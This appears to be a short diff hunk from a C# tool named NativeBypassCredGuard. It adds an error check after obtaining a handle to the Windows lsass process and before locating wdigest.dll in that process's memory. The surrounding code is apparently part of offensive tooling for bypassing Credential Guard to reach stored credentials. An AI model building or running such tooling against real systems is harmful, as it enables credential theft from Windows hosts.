@@ -440,6 +440,10 @@ namespace NativeBypassCredGuard
 
                 // NtGetNextProcess + NtQueryInformationProcess -> Get lsass process handle 
                 IntPtr lsassHandle = GetProcessByName(proc_name);
+                if (lsassHandle == IntPtr.Zero) {
+                    Console.WriteLine("[-] It was not possible to get lsass handle.");
+                    return;
+                }
 
                 // NtQueryInformationProcess -> wdigest.dll address in lsass
                 IntPtr hModule = CustomGetModuleHandle(lsassHandle, dllName);
